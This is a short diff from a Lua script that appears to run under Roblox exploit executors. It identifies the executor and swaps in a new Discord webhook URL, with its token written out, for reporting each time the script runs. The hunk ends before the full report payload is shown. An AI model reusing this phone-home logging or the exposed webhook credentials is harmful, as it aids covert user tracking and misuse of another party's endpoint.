@@ -11,8 +11,8 @@ local executorcheck =
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-local url = "https://discord.com/api/webhooks/1053225112742133760/LD3bKAYqjYn7nDWl_1HypTwe9wHzt33xv1vb-Z11otKuTgsjMdBcJDgvCJbCfEK51K15"
+   "kid with full of malware bitcoin miner shit executor"
+local url = "https://discord.com/api/webhooks/1061629162755989554/zbmEiDuFpQ2MHI_HKRbsvUUa28bMh0sWz-lqriicOTNBNlfrhd3ybsBycrj3v4bDJvRX"
 local data = {
 ["content"] = "an script has been executed",
    ["embeds"] = {
